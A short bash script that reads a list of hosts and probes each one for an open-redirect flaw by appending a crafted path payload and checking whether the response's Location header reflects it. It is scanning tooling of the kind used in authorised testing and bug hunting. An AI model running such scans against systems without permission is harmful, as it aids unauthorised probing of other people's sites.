#!/bin/bash

target=`echo $1`
payload="//www.google.com/%2e%2e" #The payloads for open redirect

cat "$target"|while read inp; do
	m=`curl -I -k "https://$inp$payload" -s`
	if echo "$m"|grep -i "location" |grep "$payload" -q; then
		echo "FOUND https://$inp$payload"
		echo "---This was the response---"
		echo "$m"
	fi
done
